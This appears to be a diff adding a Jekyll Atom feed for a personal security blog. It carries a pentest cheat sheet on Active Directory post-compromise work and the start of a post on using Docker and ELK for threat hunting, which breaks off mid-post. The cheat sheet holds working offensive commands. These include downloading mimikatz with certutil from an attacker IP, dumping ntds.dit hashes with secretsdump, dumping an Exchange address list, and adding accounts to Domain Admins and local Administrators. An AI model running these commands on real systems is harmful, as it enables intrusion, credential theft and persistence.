@@ -1,0 +1,151 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2020-04-07T05:30:45-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">id3s3c.github.io</title><entry><title type="html">General cheat sheets</title><link href="http://0.0.0.0:4000/2020/04/06/general-cheat-sheets.html" rel="alternate" type="text/html" title="General cheat sheets" /><published>2020-04-06T00:00:00-05:00</published><updated>2020-04-06T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2020/04/06/general-cheat-sheets</id><content type="html" xml:base="http://0.0.0.0:4000/2020/04/06/general-cheat-sheets.html">&lt;p&gt;Compilation of personal notes&lt;/p&gt;
+
+&lt;h1 id=&quot;office365owa-mailsniper---httpwwwdafthackcomfilesmailsniper-field-manualpdf&quot;&gt;Office365/OWA (MailSniper) - http://www.dafthack.com/files/MailSniper-Field-Manual.pdf&lt;/h1&gt;
+
+&lt;h2 id=&quot;dump-e-mail-accounts-after-first-account-compromise&quot;&gt;Dump e-mail accounts after first account compromise&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MailSniper.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-GlobalAddressList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExchHostname&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'outlook.office365.com'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UserName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username@domain.com.br'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Spring2017'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;global-address-list.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;ad-and-powershell&quot;&gt;AD and Powershell&lt;/h1&gt;
+
+&lt;h2 id=&quot;powershell-mode&quot;&gt;Powershell mode&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$ExecutionContext&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.SessionState.LanguageMode&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;restore-deleted-objects-from-recycle-bin&quot;&gt;Restore deleted objects from Recycle Bin&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 1. Check if the feature is enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADOptionalFeature&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Recycle Bin Feature&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;select-object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EnabledScopes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 2. Retrieve AD Object and restore it&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Filter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sAMAccountName -eq &quot;DeletedAdmin&quot;'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Restore-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;check-user-acls&quot;&gt;Check user ACLs&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-ACL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AD:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADUser&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myaccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;distinguishedname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;).access
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;bloodhound-ingestor---httpshunter2gitbookiodarthsidiousenumerationbloodhound&quot;&gt;Bloodhound ingestor - https://hunter2.gitbook.io/darthsidious/enumeration/bloodhound&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-Bloodhound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Compress&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;check-password-policy-for-lockouts&quot;&gt;Check password policy for lockouts&lt;/h2&gt;
+&lt;div class=&quot;language-bat highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;accounts&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;get-current-domain-and-domain-controller&quot;&gt;Get current domain and domain controller&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.DirectoryServices.ActiveDirectory.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetCurrentDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;search-logged-on-users-from-domain-joined-computer&quot;&gt;Search logged on users (From domain joined computer)&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerView.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-NetLoggedon&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client123&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# -Server dc01.corp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-NetSession&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dc01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;list-domain-users&quot;&gt;List domain users&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADUser&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;powershell-prompt-in-domain-context-useful-for-bloodhound-ingestor-from-outside-a-domain-joined-box-or-querying-stuff-in-ad&quot;&gt;Powershell prompt in domain context (Useful for bloodhound ingestor from outside a domain-joined box or querying stuff in AD)&lt;/h2&gt;
+&lt;div class=&quot;language-bat highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;runas&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/netonly /user&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;:domain&lt;/span&gt;\user &lt;span class=&quot;kd&quot;&gt;powershell&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;all-groups-that-the-user-belongs-to&quot;&gt;All Groups that the user belongs to&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADPrincipalGroupMembership&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;adding-domain-user-need-rsat-module&quot;&gt;Adding domain user (Need RSAT module)&lt;/h1&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;New-ADUser&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Satinha da Silva&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Samusername&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sata.silva&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$True&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add-ADGroupMember&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Domain Admin&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Members&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;satinha&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;creating-local-user&quot;&gt;Creating local user&lt;/h1&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsSecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-LocalUser&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User03&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-FullName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Third User&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Description&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Description of this account.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# cmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/add&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;localgroup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Administrators&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/add&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;download-files-from-windows&quot;&gt;Download files from windows&lt;/h1&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.10.10/mimikatz.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mimikatz.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IWR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://asdasd.com.br/file.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Outfile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;file.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# (Invoke-WebRequest)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;remote-dump-ntdsdit-file&quot;&gt;Remote dump ntds.dit file&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;secretsdump.py &lt;span class=&quot;nt&quot;&gt;-just-dc-ntlm&lt;/span&gt; domain/user@dc-name.corp 43ad9d72b6fad288056f81166418c3bf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;object-properties&quot;&gt;Object properties&lt;/h1&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-SearchBase&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DC=corp,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-filter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'SamAccountName -eq &quot;admin&quot;'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-property&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;enumerate-ldap-distingued-names&quot;&gt;Enumerate LDAP distingued names&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; dc-01.corp.local &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base namingcontexts
+&lt;span class=&quot;c&quot;&gt;# And then dumping it&lt;/span&gt;
+ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; dc-01.corp.local &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DC=corp,DC=local'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Compilation of personal notes</summary></entry><entry><title type="html">Leveraging DevOps to Threat Hunt</title><link href="http://0.0.0.0:4000/2020/04/06/leverage-devops-to-threat-hunt.html" rel="alternate" type="text/html" title="Leveraging DevOps to Threat Hunt" /><published>2020-04-06T00:00:00-05:00</published><updated>2020-04-06T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2020/04/06/leverage-devops-to-threat-hunt</id><content type="html" xml:base="http://0.0.0.0:4000/2020/04/06/leverage-devops-to-threat-hunt.html">&lt;h1 id=&quot;leveraging-devops-to-threat-hunt&quot;&gt;Leveraging DevOps to Threat Hunt&lt;/h1&gt;
+
+&lt;p&gt;So recently I started a freelance gig in devops, cause I always liked the sysadmin stuff and messing with devops tools like &lt;code class=&quot;highlighter-rouge&quot;&gt;ansible&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;salt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt;, and would like to do two things:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Use them in real world scenarios to build something big, and when to use each one.&lt;/li&gt;
+  &lt;li&gt;Leverage them to increase the overall security view of networks/applications, including in software development life cycle.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Disclaimer: I know that the buzzword is used to define &lt;em&gt;roles&lt;/em&gt; instead of a culture change, with the objective to join &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ops&lt;/code&gt; teams, but you know that this doesn’t happen in most cases, so why not.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;And recently I was in charge of organizing a &lt;em&gt;not so running&lt;/em&gt; security operation with a low budge (none), so I started studying the options and eventually stumbled into the &lt;a href=&quot;https://www.elastic.co/pt/elastic-stack&quot;&gt;ELK Stack&lt;/a&gt;, and their parallel projects like &lt;a href=&quot;https://github.com/philhagen/sof-elk&quot;&gt;HELK&lt;/a&gt;, &lt;a href=&quot;https://github.com/philhagen/sof-elk&quot;&gt;SOF&lt;/a&gt;. Tried some of them and soon realized that a solid knowledge of the elastic stack was needed to understand and customize the installs. So I started the elastic learning journey.&lt;/p&gt;
+
+&lt;p&gt;Before staring I knew that I would need to understand/learn how to use the configuration management tools, and master the container technologies, and fortunately I got a free course of &lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;kubernetes&lt;/code&gt; from my company, so I would like to share what I learned, my experiences and some tips.&lt;/p&gt;
+
+&lt;h2 id=&quot;docker-and-containers&quot;&gt;Docker and containers&lt;/h2&gt;
+
+&lt;p&gt;So what exactly is a container? Well, &lt;a href=&quot;https://en.wikipedia.org/wiki/OS-level_virtualization&quot;&gt;wikipedia&lt;/a&gt; says that it is a kind of virtualization, where multiples &lt;strong&gt;isolated&lt;/strong&gt; user spaces instances run. For those familiar with *nix stuff, think of a kind of &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot &lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;jails&lt;/code&gt; from bsd, adding &lt;code class=&quot;highlighter-rouge&quot;&gt;cgoups&lt;/code&gt; for cpu/mem limiting, &lt;code class=&quot;highlighter-rouge&quot;&gt;ulimits&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;seccomp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;selinux/apparmor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;so-how-it-is-useful&quot;&gt;So, how it is useful?&lt;/h3&gt;
+
+&lt;p&gt;From a penetration tester perspective it can be very useful, as stated &lt;a href=&quot;https://blog.ropnop.com/docker-for-pentesters/&quot;&gt;ropnop in his blogpost&lt;/a&gt;. You can test things in a quick, disposable and clean way, be compiling some exploit to a custom architecture, be creating shellcode without installing all the crapload of &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; stuff.&lt;/p&gt;
+
+&lt;h3 id=&quot;under-the-hood&quot;&gt;Under the hood&lt;/h3&gt;
+
+&lt;p&gt;So when you install docker in your system two main things happen: a daemon is needed to receive the calls from the client and interact with the kernel, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt; client is installed.&lt;/p&gt;
+
+&lt;p&gt;One of the key components of docker are the images. They are like a cake recipe, where you define a logical sequence of instructions and commands to the ran to prepare and/or execute what it was designed for. You can build them using the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command, or you can &lt;code class=&quot;highlighter-rouge&quot;&gt;pull&lt;/code&gt; them from public/private repositories called &lt;strong&gt;registries&lt;/strong&gt;, ex: &lt;a href=&quot;https://hub.docker.com/&quot;&gt;Docker Hub&lt;/a&gt;, Quay.io (from RH), &lt;a href=&quot;https://aws.amazon.com/pt/ecr/&quot;&gt;AWS ECR&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;So a example of execution flow would be:&lt;/p&gt;
+
